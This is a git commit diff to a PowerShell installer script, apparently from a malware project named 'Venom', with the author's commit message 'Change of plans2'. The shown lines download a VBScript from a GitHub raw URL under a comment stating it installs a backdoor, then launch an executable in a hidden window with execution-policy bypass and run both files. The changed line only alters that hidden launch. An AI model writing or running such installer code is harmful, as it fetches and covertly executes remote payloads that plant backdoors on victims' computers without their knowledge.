fbafc74cebce5aa1c67d945100d158a5cee2f721
pokemonunleashed <pokemonunlaeshed@proton.me>
2025-01-27 06:13:16 -0500

    Change of plans2

--- Venom/files/installer.ps1
+++ Venom/files/installer.ps1
@@ -68,7 +68,7 @@ Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master
 #visual bsic script to install backdoor
 Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/calty2.vbs -OutFile "calty2.vbs"
 
-powershell powershell.exe -windowstyle hidden -ep bypass ./attempt1.exe
+powershell powershell.exe -windowstyle hidden -ep bypass $path ./attempt1.exe
 
 .\attempt1.exe; ./calty2
 
